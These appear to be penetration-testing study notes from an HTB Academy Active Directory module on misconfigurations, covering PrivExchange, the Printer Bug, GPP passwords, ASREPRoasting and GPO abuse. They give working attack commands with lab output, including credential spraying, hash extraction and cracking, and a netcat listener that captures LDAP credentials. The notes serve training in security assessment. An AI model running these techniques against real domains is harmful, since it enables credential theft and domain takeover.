# 🔧 **Miscellaneous Misconfigurations**

## 🎯 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

**Miscellaneous Misconfigurations** represent a broad collection of Active Directory vulnerabilities and attack vectors that may be encountered during assessments. These techniques exploit various design flaws, legacy features, and administrative oversights that can lead to domain compromise. Understanding these diverse attack vectors helps penetration testers think outside the box and discover issues that others might miss, providing comprehensive coverage of potential AD weaknesses.

---

### 🔗 **Attack Chain Context**

**Complete Active Directory Assessment Timeline:**
```
Standard Techniques → Miscellaneous Misconfigurations → Additional Attack Vectors → Comprehensive Coverage
   (Core Methods)         (Diverse Vulnerabilities)        (Edge Cases)          (Complete Assessment)
```

**Coverage Areas:**
- **Exchange-related vulnerabilities**: PrivExchange, group memberships
- **Protocol flaws**: Printer Bug (MS-RPRN), MS14-068 Kerberos
- **Legacy features**: GPP passwords, ASREPRoasting
- **Administrative oversights**: DNS records, SYSVOL scripts, description fields
- **Group Policy abuse**: GPO misconfigurations and exploitation

---

## 📧 **Exchange Related Group Membership**

### **Exchange Security Model Overview**

#### **Critical Exchange Groups**
| Group Name | Privileges | Attack Potential |
|------------|------------|------------------|
| **Exchange Windows Permissions** | Write DACL to domain object | Can grant DCSync privileges |
| **Organization Management** | Full Exchange control ("Domain Admins" of Exchange) | Access all mailboxes, modify security groups |
| **Account Operators** | Can add accounts to Exchange groups | Lateral movement vector |

#### **Exchange Windows Permissions Exploitation**
```powershell
# Default installation vulnerability - non-protected group with dangerous privileges
# Members can write DACL to domain object
# Exploitation: Grant DCSync privileges to controlled account
```

### **Attack Methodology**

#### **Privilege Escalation via Exchange Groups**
1. **Identify Exchange group memberships**: Enumerate current user's group memberships
2. **Leverage DACL misconfiguration**: If member of Exchange Windows Permissions
3. **Grant DCSync privileges**: Modify domain object ACL to include DCSync rights
4. **Execute DCSync attack**: Extract domain credentials using secretsdump.py or Mimikatz

#### **Common Attack Vectors**
- **DACL misconfiguration**: Direct addition to Exchange Windows Permissions group
- **Account Operators abuse**: Add accounts to Exchange groups
- **Credential dumping**: Exchange servers contain numerous cached credentials
- **OWA exploitation**: Outlook Web Access credential harvesting

### **Exchange Server Compromise Impact**
- **Domain Admin privileges**: Exchange servers often lead to full domain compromise
- **Credential harvesting**: 10s to 100s of cleartext credentials/NTLM hashes in memory
- **OWA credential caching**: User logons cached after successful authentication
- **Mailbox access**: Organization Management can access all domain user mailboxes

---

## 🏃 **PrivExchange Attack**

### **Vulnerability Overview**
- **Flaw**: Exchange Server PushSubscription feature vulnerability
- **Impact**: Any domain user with mailbox can force Exchange server authentication
- **Protocol**: HTTP authentication to attacker-controlled host
- **Privilege**: Exchange service runs as SYSTEM with WriteDacl privileges (pre-2019 CU)

### **Attack Methodology**

#### **LDAP Relay Attack**
```bash
# PrivExchange exploitation flow:
# 1. Domain user forces Exchange server authentication
# 2. Relay authentication to LDAP
# 3. Dump domain NTDS database
# 4. Achieve Domain Admin privileges
```

#### **Prerequisites**
- **Domain user account**: Any authenticated domain user with mailbox
- **Exchange vulnerability**: Pre-2019 Cumulative Update installations
- **Network positioning**: Ability to perform NTLM relay attacks
- **LDAP relay capability**: Access to domain controller LDAP service

### **Exploitation Process**
1. **Force Exchange authentication**: Use PushSubscription feature to coerce authentication
2. **NTLM relay setup**: Configure ntlmrelayx.py targeting domain controller LDAP
3. **Credential extraction**: Dump NTDS database via relayed SYSTEM privileges
4. **Domain compromise**: Use extracted credentials for full domain access

---

## 🖨️ **Printer Bug (MS-RPRN)**

### **MS-RPRN Protocol Vulnerability**

#### **Technical Details**
- **Protocol**: MS-RPRN (Print System Remote Protocol)
- **Function**: Print job processing and print system management
- **Vulnerability**: RpcOpenPrinter and RpcRemoteFindFirstPrinterChangeNotificationEx abuse
- **Impact**: Force server authentication to attacker-controlled host over SMB

#### **Attack Prerequisites**
- **Domain user access**: Any domain user can connect to spooler's named pipe
- **Spooler service**: Runs as SYSTEM, installed by default on Windows servers
- **Desktop Experience**: Required for spooler service installation

### **Exploitation Methods**

#### **Method 1: LDAP Relay for DCSync**
```powershell
# Attack flow:
# 1. Force domain controller authentication via MS-RPRN
# 2. Relay to LDAP
# 3. Grant DCSync privileges to attacker account
# 4. Extract all password hashes from AD
```

#### **Method 2: RBCD (Resource-Based Constrained Delegation)**
```powershell
# Attack flow:
# 1. Relay LDAP authentication
# 2. Grant RBCD privileges for victim to controlled computer
# 3. Authenticate as any user on victim computer
# 4. Compromise Domain Controller in partner domain/forest
```

### **Vulnerability Assessment**

#### **Enumeration with SecurityAssessment.ps1**
```powershell
# Import the SecurityAssessment module
Import-Module .\SecurityAssessment.ps1

# Check for MS-RPRN Printer Bug vulnerability
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Expected output for vulnerable system:
ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

#### **Alternative Detection Tools**
- **Get-SpoolStatus module**: Check individual hosts for vulnerability
- **Specialized Python tools**: Automated MS-RPRN vulnerability scanning
- **Network enumeration**: Identify systems with spooler service enabled

### **Cross-Forest Attack Applications**
- **Forest trust exploitation**: Attack across forest boundaries
- **Unconstrained delegation**: Target systems with unconstrained delegation
- **Trust relationship abuse**: Leverage TGT delegation in trusted environments

---

## 🎫 **MS14-068 Kerberos Vulnerability**

### **Kerberos PAC Forging Vulnerability**

#### **Technical Background**
- **Vulnerability**: Kerberos Privilege Attribute Certificate (PAC) validation flaw
- **Impact**: Standard domain user → Domain Admin privilege escalation
- **Mechanism**: Forged PAC accepted as legitimate by KDC
- **Authentication**: Uses secret keys to validate PAC integrity

#### **Exploitation Process**
1. **PAC manipulation**: Create fake PAC presenting user as Domain Administrator
2. **KDC bypass**: Exploit validation flaw to accept forged PAC
3. **Privilege escalation**: Gain Domain Admin or other privileged group membership
4. **Ticket generation**: Create legitimate tickets with forged privileges

### **Exploitation Tools**

#### **Python Kerberos Exploitation Kit (PyKEK)**
```bash
# PyKEK exploitation for MS14-068
# Requires: Domain user credentials, vulnerable KDC
# Result: Domain Administrator privileges
```

#### **Impacket Toolkit**
```bash
# Impacket-based MS14-068 exploitation
# Alternative tool for Kerberos PAC forging
# Cross-platform Python implementation
```

### **Defense and Remediation**
- **Patching**: Only defense against MS14-068 is applying security updates
- **Legacy systems**: Often found on older, unpatched domain controllers
- **Assessment value**: Demonstrates critical importance of patch management

---

## 🔍 **Sniffing LDAP Credentials**

### **Application and Device Vulnerabilities**

#### **Common Credential Storage Locations**
- **Web admin consoles**: Applications storing LDAP credentials for domain connectivity
- **Network printers**: LDAP authentication credentials in device configuration
- **Service applications**: Software requiring domain authentication
- **Legacy systems**: Older applications with poor credential management

#### **Attack Methodology**

#### **Method 1: Cleartext Credential Discovery**
```powershell
# Direct credential viewing in web interfaces
# Often found in:
# - Printer web admin panels
# - Application configuration pages
# - Service management consoles
```

#### **Method 2: Test Connection Exploitation**
```bash
# Setup netcat listener on LDAP port
nc -lvnp 389

# Modify application LDAP settings:
# 1. Change LDAP server IP to attacker host
# 2. Trigger "test connection" function
# 3. Capture credentials sent to attacker machine
# 4. Credentials often transmitted in cleartext
```

#### **Method 3: Full LDAP Server Simulation**
```bash
# Deploy complete LDAP server
# Capture and analyze authentication attempts
# Extract credentials from LDAP bind operations
# Requires more sophisticated setup but more reliable
```

### **Credential Privilege Assessment**
- **Service accounts**: Often highly privileged for application functionality
- **Initial foothold**: May provide first domain access in external assessments
- **Lateral movement**: Credentials may be reused across multiple systems
- **Privilege escalation**: Service accounts sometimes have elevated permissions

---

## 🌐 **Enumerating DNS Records**

### **DNS Enumeration with adidnsdump**

#### **Tool Overview**
- **Purpose**: Enumerate all DNS records in Active Directory domain
- **Access requirement**: Valid domain user account
- **Method**: LDAP queries to extract DNS zone information
- **Advantage**: Bypasses normal DNS query limitations

#### **Why DNS Enumeration Matters**
```powershell
# Problem: Non-descriptive hostnames
# Example: SRV01934.INLANEFREIGHT.LOCAL
# Solution: DNS records reveal actual purpose
# Discovery: JENKINS.INLANEFREIGHT.LOCAL → same IP as SRV01934
```

### **Practical DNS Enumeration**

#### **Basic DNS Enumeration**
```bash
# Basic adidnsdump execution
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

# Enter password when prompted
Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

#### **Analyzing Initial Results**
```bash
# Review discovered records
head records.csv 

# Sample output showing unknown records:
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

#### **Advanced Resolution with -r Flag**
```bash
# Use -r flag to resolve unknown records via A queries
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

# Enhanced output with resolved records:
head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

### **Strategic Value of DNS Enumeration**
- **Target identification**: Discover purpose of non-descriptive hostnames
- **Hidden services**: Uncover services not found through normal enumeration
- **Infrastructure mapping**: Understand network architecture and services
- **Attack planning**: Prioritize targets based on discovered services

---

## 🔐 **Other Misconfigurations**

### **Password in Description Field**

#### **Common Administrative Oversight**
```powershell
# Administrators sometimes store passwords in user account fields
# Common locations:
# - Description field
# - Notes field
# - Other custom attributes
```

#### **Enumeration with PowerView**
```powershell
# Search for accounts with populated description fields
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Sample output revealing credentials:
samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

#### **Analysis and Exploitation**
- **Export to CSV**: For large domains, export data for offline analysis
- **Password patterns**: Look for obvious password patterns in descriptions
- **Historical passwords**: Old passwords may be reused elsewhere
- **Service accounts**: Often contain current or legacy passwords

### **PASSWD_NOTREQD Field Analysis**

#### **UserAccountControl Attribute**
```powershell
# PASSWD_NOTREQD flag implications:
# - User not subject to current password policy length
# - Could have shorter password or no password at all
# - May be set intentionally or accidentally
# - Common in vendor product installations
```

#### **Enumeration and Testing**
```powershell
# Find accounts with PASSWD_NOTREQD flag
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# Sample output:
samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

#### **Testing Strategy**
- **Empty password testing**: Attempt authentication with blank passwords
- **Weak password testing**: Try common weak passwords
- **Password spraying**: Use discovered accounts in password spray attacks
- **Documentation**: Include findings in comprehensive assessments

### **Credentials in SMB Shares and SYSVOL Scripts**

#### **SYSVOL Share Enumeration**
```powershell
# SYSVOL is readable by all authenticated domain users
# Common script storage location
# Often contains legacy credentials
```

#### **Script Discovery**
```powershell
# List scripts in SYSVOL
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Sample directory contents:
Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

#### **Script Analysis Example**
```powershell
# Examine suspicious script
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

# Script contents revealing credentials:
On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
```

#### **Credential Validation**
```bash
# Test discovered credentials across domain
crackmapexec smb <target_range> --local-auth -u Administrator -p '!ILFREIGHT_L0cALADmin!'
```

---

## 🔑 **Group Policy Preferences (GPP) Passwords**

### **GPP Vulnerability Overview**

#### **Historical Context**
- **Creation**: GPP creates .xml files in SYSVOL share
- **Caching**: Files cached locally on endpoints where GP applies
- **Encryption**: AES-256 bit encryption with published private key
- **Patch**: MS14-025 (2014) prevented new GPP passwords but didn't remove existing ones

#### **Vulnerable File Types**
| File Name | Purpose | Credential Risk |
|-----------|---------|-----------------|
| `drives.xml` | Map network drives | Username/password for drive access |
| `printers.xml` | Printer configurations | Service account credentials |
| `services.xml` | Service creation/updates | Service account passwords |
| `scheduledtasks.xml` | Scheduled task creation | Task execution credentials |
| `groups.xml` | Local user management | Local administrator passwords |

### **GPP Password Extraction**

#### **Manual Decryption**
```bash
# Example cpassword value from Groups.xml:
# cpassword="VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE"

# Decrypt using gpp-decrypt utility
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Decrypted result:
Password1
```

#### **Automated Tools**

##### **CrackMapExec Modules**
```bash
# List available GPP modules
crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

##### **GPP Password Extraction**
```bash
# Extract GPP passwords using CrackMapExec
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
```

##### **GPP Autologon Discovery**
```bash
# Search for autologon credentials in Registry.xml
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

# Sample output:
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

#### **Alternative Tools**
- **Get-GPPPassword.ps1**: PowerShell script for GPP password extraction
- **GPP Metasploit Post Module**: MSF module for automated GPP hunting
- **Python/Ruby scripts**: Various custom tools for GPP password discovery

### **Strategic Considerations**
- **Legacy accounts**: GPP passwords often for disabled/locked accounts
- **Password reuse**: Discovered passwords worth testing across domain
- **Local admin passwords**: High value for lateral movement
- **Persistence**: Files remain even after GPO deletion if not properly cleaned

---

## 🎫 **ASREPRoasting**

### **Kerberos Pre-Authentication Bypass**

#### **Technical Background**
- **Target**: Accounts with "Do not require Kerberos pre-authentication" enabled
- **Method**: Request AS-REP (Authentication Service Reply) without pre-auth
- **Encryption**: AS-REP encrypted with account's password
- **Attack**: Offline password attack on retrieved AS-REP

#### **Pre-Authentication vs. ASREPRoasting**
```powershell
# Normal pre-authentication:
# 1. User enters password
# 2. Password encrypts timestamp
# 3. DC decrypts to validate password
# 4. TGT issued if successful

# ASREPRoasting (no pre-auth required):
# 1. Request authentication data
# 2. Retrieve encrypted TGT from DC
# 3. Offline password attack on TGT
# 4. No password validation required
```

### **Account Enumeration**

#### **PowerView Enumeration**
```powershell
# Find accounts with DONT_REQ_PREAUTH flag
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Sample output:
samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

#### **Active Directory Module**
```powershell
# Alternative enumeration method
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### **AS-REP Extraction**

#### **Method 1: Rubeus (Windows)**
```powershell
# Extract AS-REP for specific user
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Sample output:
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting
[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

#### **Method 2: Kerbrute (Automatic Discovery)**
```bash
# Kerbrute automatically retrieves AS-REP for vulnerable users
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

# Sample output showing automatic AS-REP extraction:
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
```

#### **Method 3: GetNPUsers.py (Linux)**
```bash
# Impacket tool for ASREPRoasting
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

# Sample output:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### **Password Cracking**

#### **Hashcat Offline Cracking**
```bash
# Crack AS-REP hash using Hashcat mode 18200
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

# Successful cracking output:
hashcat (v6.1.1) starting...

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

### **Forced ASREPRoasting**
- **GenericWrite/GenericAll**: Can enable DONT_REQ_PREAUTH on target account
- **Attack workflow**: Enable attribute → Extract AS-REP → Crack password → Disable attribute
- **Stealth considerations**: Temporary attribute modification may be logged

---

## 🏛️ **Group Policy Object (GPO) Abuse**

### **GPO Security Model Overview**

#### **GPO Attack Potential**
- **Lateral movement**: Modify GPOs affecting multiple hosts
- **Privilege escalation**: Add rights to controlled user accounts
- **Domain compromise**: GPO modifications can lead to full domain control
- **Persistence**: GPO changes persist across reboots and user sessions

#### **Common GPO Abuse Techniques**
| Attack Type | Method | Impact |
|-------------|--------|---------|
| **User Rights Assignment** | Add SeDebugPrivilege, SeTakeOwnershipPrivilege | Privilege escalation |
| **Local Administrator Addition** | Add user to local admins group | Host compromise |
| **Scheduled Task Creation** | Create immediate scheduled task | Code execution |
| **Startup Script Modification** | Modify computer startup scripts | Persistence |

### **GPO Enumeration**

#### **PowerView GPO Discovery**
```powershell
# Enumerate all GPOs by display name
Get-DomainGPO | select displayname

# Sample output:
displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

#### **Built-in PowerShell Cmdlets**
```powershell
# Alternative enumeration using GroupPolicy module
Get-GPO -All | Select DisplayName

# Sample output:
DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

### **GPO Permission Analysis**

#### **Domain Users Group Rights Assessment**
```powershell
# Check if Domain Users have rights over any GPOs
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Sample dangerous permissions:
ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

#### **GPO GUID to Name Resolution**
```powershell
# Convert GPO GUID to friendly name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

# Output:
DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

### **BloodHound GPO Analysis**
- **Visual representation**: GPO relationships and affected objects
